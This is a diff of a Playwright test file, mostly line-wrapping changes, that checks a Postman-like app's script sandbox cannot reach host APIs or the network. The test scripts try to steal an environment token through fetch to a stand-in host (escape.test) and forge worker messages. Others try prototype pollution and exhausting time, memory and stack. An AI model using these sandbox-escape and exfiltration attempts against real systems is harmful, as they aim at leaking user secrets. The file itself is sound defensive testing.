@@ -19,13 +19,46 @@ const CANARY = "https://escape.test";
 /** What ECMAScript puts on a global object, as QuickJS has it, and the sixteen names the host adds (ten of them the globals of Postman's older sandbox). Anything else got in. */
 const BUILT_INS =
   "AggregateError Array ArrayBuffer BigInt BigInt64Array BigUint64Array Boolean DataView Date Error EvalError FinalizationRegistry Float16Array Float32Array Float64Array Function Infinity Int16Array Int32Array Int8Array InternalError Iterator JSON Map Math NaN Number Object Promise Proxy RangeError ReferenceError Reflect RegExp Set SharedArrayBuffer String Symbol SyntaxError TypeError URIError Uint16Array Uint32Array Uint8Array Uint8ClampedArray WeakMap WeakRef WeakSet decodeURI decodeURIComponent encodeURI encodeURIComponent escape eval globalThis isFinite isNaN parseFloat parseInt undefined unescape";
-const ALLOWED = "pm console atob btoa setTimeout require postman tests responseBody responseCode responseTime responseHeaders request environment globals iteration data";
+const ALLOWED =
+  "pm console atob btoa setTimeout require postman tests responseBody responseCode responseTime responseHeaders request environment globals iteration data";
 
 /** Names a browser, a worker or Node would offer. None may exist inside the sandbox by any road. */
 const HOST_NAMES = [
-  "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "RTCPeerConnection", "importScripts", "postMessage", "self", "window", "document",
-  "navigator", "location", "Worker", "SharedWorker", "BroadcastChannel", "MessageChannel", "indexedDB", "caches", "localStorage", "sessionStorage", "cookieStore",
-  "WebAssembly", "crypto", "performance", "queueMicrotask", "setInterval", "structuredClone", "EventTarget", "process", "module", "host", "close", "name", "onmessage",
+  "fetch",
+  "XMLHttpRequest",
+  "WebSocket",
+  "EventSource",
+  "WebTransport",
+  "RTCPeerConnection",
+  "importScripts",
+  "postMessage",
+  "self",
+  "window",
+  "document",
+  "navigator",
+  "location",
+  "Worker",
+  "SharedWorker",
+  "BroadcastChannel",
+  "MessageChannel",
+  "indexedDB",
+  "caches",
+  "localStorage",
+  "sessionStorage",
+  "cookieStore",
+  "WebAssembly",
+  "crypto",
+  "performance",
+  "queueMicrotask",
+  "setInterval",
+  "structuredClone",
+  "EventTarget",
+  "process",
+  "module",
+  "host",
+  "close",
+  "name",
+  "onmessage",
 ];
 
 interface Watch {
@@ -46,17 +79,24 @@ async function watch(page: Page, baseURL: string | undefined): Promise<Watch> {
   page.on("pageerror", (error) => errors.push(error.message));
   await page.context().route(`${CANARY}/**`, async (route) => {
     canary.push(route.request().url());
-    await route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*", "content-type": "text/javascript" }, body: "globalThis.escaped = true;" });
+    await route.fulfill({
+      status: 200,
+      headers: { "access-control-allow-origin": "*", "content-type": "text/javascript" },
+      body: "globalThis.escaped = true;",
+    });
   });
   await page.addInitScript(() => {
     const seen: string[] = [];
     (window as unknown as { __violations: string[] }).__violations = seen;
-    document.addEventListener("securitypolicyviolation", (e) => seen.push(`${e.effectiveDirective} ${e.blockedURI} ${e.sample}`));
+    document.addEventListener("securitypolicyviolation", (e) =>
+      seen.push(`${e.effectiveDirective} ${e.blockedURI} ${e.sample}`),
+    );
   });
   return {
     canary,
     errors,
-    foreign: () => all.filter((url) => !url.startsWith(`${baseURL}/`) && !url.startsWith("data:") && !url.startsWith("blob:")),
+    foreign: () =>
+      all.filter((url) => !url.startsWith(`${baseURL}/`) && !url.startsWith("data:") && !url.startsWith("blob:")),
     violations: () => page.evaluate(() => (window as unknown as { __violations: string[] }).__violations),
   };
 }
@@ -73,13 +113,19 @@ async function rows(page: Page): Promise<{ passed: string[]; failed: string[] }>
   };
 }
 
-test("@claim:C-052 a script finds no host capability: no network, no worker scope, no storage, by any road to the global object", async ({ page, baseURL }) => {
+test("@claim:C-052 a script finds no host capability: no network, no worker scope, no storage, by any road to the global object", async ({
+  page,
+  baseURL,
+}) => {
   const seen = await watch(page, baseURL);
   await captureTarget(page);
-  const response = await seedAndOpen(page, {}, {
-    method: "GET",
-    url: `${TARGET}/escape-globals`,
-    postRequestScript: `
+  const response = await seedAndOpen(
+    page,
+    {},
+    {
+      method: "GET",
+      url: `${TARGET}/escape-globals`,
+      postRequestScript: `
       const names = ${JSON.stringify(HOST_NAMES)};
       const roads = {
         "typeof": (name) => Function("return typeof " + name)(),
@@ -130,7 +176,8 @@ test("@claim:C-052 a script finds no host capability: no network, no worker scop
         if (/https?:|worker|chunk|\\.js:\\d+:\\d+\\)?\\s*$/m.test(stack.replace(/script\\.js|wayfarer\\.js/g, ""))) throw new Error(stack);
       });
     `,
-  });
+    },
+  );
   await expectProdParity(response);
   const result = await rows(page);
   expect(result.failed).toEqual([]);
@@ -139,13 +186,19 @@ test("@claim:C-052 a script finds no host capability: no network, no worker scop
   expect(seen.errors).toEqual([]);
 });
 
-test("@claim:C-052 running a script makes no request: every network road is tried and nothing leaves", async ({ page, baseURL }) => {
+test("@claim:C-052 running a script makes no request: every network road is tried and nothing leaves", async ({
+  page,
+  baseURL,
+}) => {
   const seen = await watch(page, baseURL);
   const hits = await captureTarget(page);
-  await seedAndOpen(page, { token: "a-value-worth-stealing" }, {
-    method: "GET",
-    url: `${TARGET}/escape-network`,
-    preRequestScript: `
+  await seedAndOpen(
+    page,
+    { token: "a-value-worth-stealing" },
+    {
+      method: "GET",
+      url: `${TARGET}/escape-network`,
+      preRequestScript: `
       const stolen = encodeURIComponent(pm.environment.get("token"));
       const attempts = {
         fetch: () => fetch("${CANARY}/fetch?" + stolen),
@@ -185,7 +238,7 @@ test("@claim:C-052 running a script makes no request: every network road is trie
         });
       }, 50);
     `,
-    postRequestScript: `
+      postRequestScript: `
       pm.test("a forged result cannot be posted", () => {
         let error;
         try { postMessage({ id: "forged", type: "result", result: { logs: [], envMutations: { token: "forged" }, testResults: [{ label: "forged row", passed: true, source: "script" }] } }); } catch (thrown) { error = thrown; }
@@ -193,7 +246,8 @@ test("@claim:C-052 running a script makes no request: every network road is trie
         if (typeof self !== "undefined" || typeof globalThis.onmessage !== "undefined") throw new Error("a worker scope is in reach");
       });
     `,
-  });
+    },
+  );
   const result = await rows(page);
   expect(result.failed).toEqual([]);
   // Ten attempts, the libraries, the dynamic import, and the forged result.
@@ -210,15 +264,21 @@ test("@claim:C-052 running a script makes no request: every network road is trie
   expect(await page.evaluate(() => (globalThis as { escaped?: unknown }).escaped)).toBeUndefined();
 });
 
-test("@claim:C-052 the only requests a script makes are the ones it asks the app for with pm.sendRequest, and each goes out as the user's own does", async ({ page, baseURL }) => {
+test("@claim:C-052 the only requests a script makes are the ones it asks the app for with pm.sendRequest, and each goes out as the user's own does", async ({
+  page,
+  baseURL,
+}) => {
   const seen = await watch(page, baseURL);
   const hits = await captureTarget(page);
   // A cookie the browser holds for the target: no request of the app may carry it.
   await page.context().addCookies([{ name: "session", value: "of-the-browser", url: TARGET }]);
-  await seedAndOpen(page, { token: "a-value-worth-stealing", protected: "{{$secret.0000}}" }, {
-    method: "GET",
-    url: `${TARGET}/escape-brokered`,
-    preRequestScript: `
+  await seedAndOpen(
+    page,
+    { token: "a-value-worth-stealing", protected: "{{$secret.0000}}" },
+    {
+      method: "GET",
+      url: `${TARGET}/escape-brokered`,
+      preRequestScript: `
       (async () => {
         const failure = async (request) => { try { await pm.sendRequest(request); return "sent"; } catch (error) { return error.name + ": " + error.message; } };
         const refusals = {
@@ -246,7 +306,8 @@ test("@claim:C-052 the only requests a script makes are the ones it asks the app
         });
       })();
     `,
-  });
+    },
+  );
   const result = await rows(page);
   expect(result.failed).toEqual([]);
   expect(result.passed).toHaveLength(6);
@@ -266,13 +327,19 @@ test("@claim:C-052 the only requests a script makes are the ones it asks the app
   expect(seen.errors).toEqual([]);
 });
 
-test("@claim:C-052 a script leaves nothing behind: the next run has a new global, and the page's own objects are untouched", async ({ page, baseURL }) => {
+test("@claim:C-052 a script leaves nothing behind: the next run has a new global, and the page's own objects are untouched", async ({
+  page,
+  baseURL,
+}) => {
   const seen = await watch(page, baseURL);
   await captureTarget(page);
-  await seedAndOpen(page, {}, {
-    method: "GET",
-    url: `${TARGET}/escape-state`,
-    postRequestScript: `
+  await seedAndOpen(
+    page,
+    {},
+    {
+      method: "GET",
+      url: `${TARGET}/escape-state`,
+      postRequestScript: `
       pm.test("nothing is left of an earlier run", () => {
         if (({}).polluted !== undefined) throw new Error("Object.prototype was changed by an earlier run");
         if (typeof leaked !== "undefined") throw new Error("a global of an earlier run is here");
@@ -285,14 +352,21 @@ test("@claim:C-052 a script leaves nothing behind: the next run has a new global
       String = () => "hijacked";
       console.log("after the changes");
     `,
-  });
+    },
+  );
   for (let run = 0; run < 3; run++) {
     const result = await rows(page);
     expect(result.failed).toEqual([]);
     expect(result.passed).toEqual(["nothing is left of an earlier run"]);
   }
   // The script's changes to Object.prototype and JSON were to the engine's objects, not the browser's.
-  expect(await page.evaluate(() => [({} as { polluted?: unknown }).polluted, JSON.stringify({ a: 1 }), [1].map((n) => n + 1)])).toEqual([null, '{"a":1}', [2]].map((v) => (v === null ? undefined : v)));
+  expect(
+    await page.evaluate(() => [
+      ({} as { polluted?: unknown }).polluted,
+      JSON.stringify({ a: 1 }),
+      [1].map((n) => n + 1),
+    ]),
+  ).toEqual([null, '{"a":1}', [2]].map((v) => (v === null ? undefined : v)));
   expect(await seen.violations()).toEqual([]);
   expect(seen.errors).toEqual([]);
 });
@@ -305,9 +379,21 @@ test("@claim:C-052 a script leaves nothing behind: the next run has a new global
 // runner may need several times a laptop's time for the same script (R6).
 test.describe("limits", () => {
   const LIMITS: [name: string, script: string, message: string][] = [
-    ["a script that never ends is stopped at the deadline", "pm.test('before the loop', () => {}); try { while (true) {} } catch (error) { console.log('caught'); }", "Script timed out after 5000 ms"],
-    ["a script that allocates 200 MB is stopped at the memory limit", "const held = []; for (let i = 0; i < 25; i++) held.push(new Uint8Array(8 * 2 ** 20));", "Script exceeded memory limit (64 MB)"],
-    ["a recursion 100,000 deep is stopped at the stack limit", "function down(n) { return n ? down(n - 1) + 1 : 0; } down(100000);", "Script exceeded the stack limit (too much recursion)"],
+    [
+      "a script that never ends is stopped at the deadline",
+      "pm.test('before the loop', () => {}); try { while (true) {} } catch (error) { console.log('caught'); }",
+      "Script timed out after 5000 ms",
+    ],
+    [
+      "a script that allocates 200 MB is stopped at the memory limit",
+      "const held = []; for (let i = 0; i < 25; i++) held.push(new Uint8Array(8 * 2 ** 20));",
+      "Script exceeded memory limit (64 MB)",
+    ],
+    [
+      "a recursion 100,000 deep is stopped at the stack limit",
+      "function down(n) { return n ? down(n - 1) + 1 : 0; } down(100000);",
+      "Script exceeded the stack limit (too much recursion)",
+    ],
   ];
 
   for (const [name, script, message] of LIMITS) {
@@ -320,12 +406,16 @@ test.describe("limits", () => {
         if (/\.wasm(\?|$)/.test(request.url())) engines.push(request.url());
       });
       const hits = await captureTarget(page);
-      await seedAndOpen(page, {}, {
-        method: "GET",
-        url: `${TARGET}/limit`,
-        preRequestScript: "pm.test('the next script ran', () => pm.expect(pm.response).to.be.null);",
-        postRequestScript: script,
-      });
+      await seedAndOpen(
+        page,
+        {},
+        {
+          method: "GET",
+          url: `${TARGET}/limit`,
+          preRequestScript: "pm.test('the next script ran', () => pm.expect(pm.response).to.be.null);",
+          postRequestScript: script,
+        },
+      );
 
       // Three sends: the pre-request script of the second and of the third each follow a limit.
       for (let run = 0; run < 3; run++) {
